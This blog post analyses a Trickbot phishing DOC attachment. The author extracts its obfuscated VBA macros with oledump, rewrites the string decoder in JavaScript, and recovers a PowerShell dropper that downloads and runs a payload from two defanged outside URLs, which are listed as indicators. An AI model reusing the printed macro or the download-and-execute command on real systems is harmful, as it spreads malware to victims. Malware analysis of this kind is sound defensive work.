---
layout: post
title:  Extracting URL's from DOC Macro (Trickbot)
tags:   ioc doc macro url malware trickbot
---

As I wrote a blog post yesterday about how to extract URL's from the given VBS script, I was looking forward to seeing a Trickbot spam-wave today with links to a VBS script.. {{more}}

But unfortunately this didn't happen.<br>
The mail i received today had a DOC file with macros as attachment.

![Email Body](/assets/images/doc_urls/email_body.png)

This time the email sender was _Amanda.Right@tax-service-gov.uk_ and again the domain was just registered today:<br>
>tax-service-gov.uk domain lookup results from whois.nic.uk server:
>
>Domain name: tax-service-gov.uk
>Registrar: GoDaddy.com, LLP. [Tag = GODADDY]
>URL: http://uk.godaddy.com
>Relevant dates:
>Registered on: 27-Jun-2018
>Expiry date:  27-Jun-2019
>Last updated:  27-Jun-2018

So as I like to extract URL's I thought I could do the same with the doc file. Preferebly without opening the document..
To analyze the document I used Python and the [_oledump.py_](https://blog.didierstevens.com/programs/oledump-py/) script with the [_OleFile_](http://www.decalage.info/python/olefileio) Python module.<br>
First I listed all the streams.<br><br>

{% highlight bash %}
$ python oledump.py payslip.doc
  1:       121 '\x01CompObj'
  2:       280 '\x05DocumentSummaryInformation'
  3:       332 '\x05SummaryInformation'
  4:      6615 '1Table'
  5:     41256 'Data'
  6:       613 'Macros/PROJECT'
  7:       119 'Macros/PROJECTwm'
  8:        97 'Macros/UserForm1/\x01CompObj'
  9:       291 'Macros/UserForm1/\x03VBFrame'
 10:       190 'Macros/UserForm1/f'
 11:       208 'Macros/UserForm1/o'
 12: M    2341 'Macros/VBA/Module1'
 13: M     980 'Macros/VBA/Module2'
 14: M    1660 'Macros/VBA/ThisDocument'
 15: M    3138 'Macros/VBA/UserForm1'
 16:      5296 'Macros/VBA/_VBA_PROJECT'
 17:      1370 'Macros/VBA/dir'
 18:        26 'ObjectPool/_1591570249/\x03OCXNAME'
 19:         6 'ObjectPool/_1591570249/\x03ObjInfo'
 20:        94 'ObjectPool/_1591570249/Contents'
 21:      4096 'WordDocument'
{% endhighlight %}
<br>In this case the streams 12 - 15 contain macros and therefore look interesting. The idea is now to extract the macro code.<br><br>

```
$ python oledump.py payslip.doc -v -s 12
Attribute VB_Name = "Module1"
Function gnkruhl()
Randomize
leng = 6 * Rnd() + 4
name1 = ""
For i = 1 To leng
num = 24 * Rnd() + 97
name1 = name1 + Chr(num)
Next i
gnkruhl = name1
End Function

Function DecodeString(text)
decode = ""
For i = 1 To Len(text)
decode = decode + GetAlphabetSymbol(SearchNum(Mid(text, i, 1)), 5)
Next i
DecodeString = decode
End Function

Function GetAlphabetSymbol(num, key)
If num - key < 1 Then
GetAlphabetSymbol = Mid(UserForm1.TextBox1, Len(UserForm1.TextBox1) + num - key, 1)
Else
GetAlphabetSymbol = Mid(UserForm1.TextBox1, num - key, 1)
End If
End Function

Function SearchNum(symbol)
For i = 1 To Len(UserForm1.TextBox1)
If symbol = Mid(UserForm1.TextBox1, i, 1) Then
SearchNum = i
End If
Next i
End Function

$ python oledump.py payslip.doc -v -s 13
Attribute VB_Name = "Module2"
Function test2(ByRef text, dec, name)
text = text + dec + name
End Function

$ python oledump.py payslip.doc -v -s 14
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Attribute VB_Control = "InkPicture1, 0, 0, MSINKAUTLib, InkPicture"
Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
UserForm1.TextBox3 = "1"
End Sub

$ python oledump.py payslip.doc -v -s 15
Attribute VB_Name = "UserForm1"
Attribute VB_Base = "0{B9A614E0-84B0-4774-992D-D7B0D0F29FE8}{412FD4FB-ADE7-47DB-91F6-BBC5A89FC56F}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

Private Sub TextBox2_Change()
Shell UserForm1.TextBox2, 0
End Sub

Private Sub TextBox3_Change()
name1 = gnkruhl()
name2 = gnkruhl()
name3 = gnkruhl()
name4 = gnkruhl()
dec1 = DecodeString("/)kt[/tgfuiojxibbt]$gfuiojxibbt]]ls(/pdf(t")
dec2 = DecodeString("{.jpod(z,t\")
dec3 = DecodeString("};{(iu f'ci/ptjajpi)%(ip%ui'/bdi(p}%kfu(bfhkldbi{\")
dec4 = DecodeString("_$$qp)gq|")
dec5 = DecodeString("%imi$$}:jphop gof/ijjt$$qp)gq|")
dec6 = DecodeString("%imi$$:-poa;")
dec7 = DecodeString("{$$xppgr[[jh'hohjfso/d(z%/f)[)f%'d($$}-/hp/x;")
dec8 = DecodeString("{$$xppgr[[hasxhj%/f%d([)f%'d($$}-$]]tetfsp ldbit i(/fkd(zthj/ddt ldbighpxtqp)gq|")
dec9 = DecodeString("%'hp:tjphop gof/ijjt$qp)gq|")
dec10 = DecodeString("%'hp$t ud(kfujpabitxdkki(]")
text = ""
test2 text, dec1, name1
test2 text, dec2, name2
test2 text, dec3, name2
test2 text, dec4, name3
test2 text, dec5, name3
test2 text, dec6, name1
test2 text, dec7, name1
test2 text, dec8, name4
test2 text, dec9, name4
test2 text, dec10, ""
UserForm1.TextBox2 = text
End Sub
```

<br>This extraction worked quite nice. But VBA code didn't really help me as I didn't know of any online VBA execution tool. The one tool I know and I really like is [_JsFiddle_](https://jsfiddle.net/). So the obvious consequence was to rewrite the code into JavaScript, what I did..<br>
Except running the Shell command on line 69 we use a _console.log()_ to print the whole code which would be executed.<br>
The one thing I didn't find in the whole VBA code was the definition for _UserForm1.TextBox1_. So I needed way to find this..<br>
And again with [_oledump.py_](https://blog.didierstevens.com/programs/oledump-py/) and a few tries I found the initialization for the variable.<br>
>$ python oledump.py payslip.doc -S -s 11
>qwertyuiopasdfghjklzxcvbnm/"'()[]${}.,\;-%_|:

I then had to modify the variable _global_text_ a little bit because the URL didn't turn out correctly the first time.
Here we go:<br><br>

```
var global_text = " qwertyuiopasdfghjklzxcvbnm/\"'()[]${.},\;-%_|:";

function gnkruhl() {
    var leng = 6 * Math.random() + 4;
    var name1 = "";
    for (var i = 1; i <= leng; i++) {
        num = 24 * Math.random() + 97;
        name1 = name1 + String.fromCharCode(num);
    }
    return name1;
}

function DecodeString(text) {
    var decode = "";
    for (var i = 1; i <= text.length; i++) {
        decode = decode + GetAlphabetSymbol(SearchNum(text.substr(i, 1)), 5);
    }
    return decode;
}

function GetAlphabetSymbol(num, key) {
    if (num - key < 1) {
        return global_text.substr(global_text.length + num - key, 1);
    } else {
        return global_text.substr(num - key, 1);
    }
}

function SearchNum(symbol) {
  for (var i = 1; i <= global_text.length; i++) {
    if (symbol == global_text.substr(i, 1)) {
        return i;
      }
  }
}

function test2 (text, dec, name){
  return text + dec + name;
}

var name1 = gnkruhl();
var name2 = gnkruhl();
var name3 = gnkruhl();
var name4 = gnkruhl();
var dec1 = DecodeString("/)kt[/tgfuiojxibbt]$gfuiojxibbt]]ls(/pdf(t")
var dec2 = DecodeString("{.jpod(z,t\\")
var dec3 = DecodeString("};{(iu f'ci/ptjajpi)%(ip%ui'/bdi(p}%kfu(bfhkldbi{\\")
var dec4 = DecodeString("_$$qp)gq|")
var dec5 = DecodeString("%imi$$}:jphop gof/ijjt$$qp)gq|")
var dec6 = DecodeString("%imi$$:-poa;")
var dec7 = DecodeString("{$$xppgr[[jh'hohjfso/d(z%/f)[)f%'d($$}-/hp/x;")
var dec8 = DecodeString("{$$xppgr[[hasxhj%/f%d([)f%'d($$}-$]]tetfsp ldbit i(/fkd(zthj/ddt ldbighpxtqp)gq|")
var dec9 = DecodeString("%'hp:tjphop gof/ijjt$qp)gq|")
var dec10 = DecodeString("%'hp$t ud(kfujpabitxdkki(]")
var text = "";
text = test2(text, dec1, name1);
text = test2( text, dec2, name2);
text = test2( text, dec3, name2);
text = test2( text, dec4, name3);
text = test2( text, dec5, name3);
text = test2( text, dec6, name1);
text = test2( text, dec7, name1);
text = test2( text, dec8, name4);
text = test2( text, dec9, name4);
text = test2( text, dec10, "");
console.log(text);

```

<br>For the newest Trickbot spamwave (2018-07-02) I had to adjust the _global_text_ variable to the following value because they chose an URL with numbers in it:

```
var global_text = "qwertyuiopasdfghjklzxcvbnm/\"'()[]${.},\;-%_:|1234567890";
```

<br>If we not put the code into [_JsFiddle_](https://jsfiddle.net/) and execute it we should get the following console output which contains the two payload URL's we were looking for:<br><br>

{% highlight bash %}
md|/c|powershell|"'powershell|""function|-wurmxdpnt)string]|q-xqdx$(newqobject|system.net.webclient
[.downloadfile(q-xqdx''qtmpq;-hrsiaabbexe''[,startqprocess|''qtmpq;-hrsiaabbexe'',{try$-wurmxdpnt''
hXXp://sabarasourcing[.]com/mo.bin''[{catch$-wurmxdpnt''hXXp://ayuhas[.]co.in/mo.bin''
[{'""|_|outqfile|qencoding|ascii|qfilepath|qtmpq;-wfebswjqbat,|startqprocess|'qtmpq;-wfebswjqbat'|qwindowstyle|hidden"-
{% endhighlight %}

<br>Payload URL's:
>hXXp://sabarasourcing[.]com/mo.bin
>hXXp://ayuhas[.]co[.]in/mo.bin

>pro memoria..

- I think it's quite interesting to reverse engineer such droppers but I'm not sure if this write-up is long lasting as they would only have to change a few lines to mess up the whole process.
- Besides this reverse engineering I think a very good indicator to find spam mails is the age of a containing domain. If the domain is that young the chances are very high that it is spam.. and here we had the proof twice in the last two days ;-)
- If the same group uses the same method as they did today it would probably be possible to just exchange the arguments of the _DecodeString_ function and get the new URL's very fast.. let's find out.
- Small Tool to extract Payload URLs on [_JsFiddle_](http://jsfiddle.net/5q32cfp6/157/)
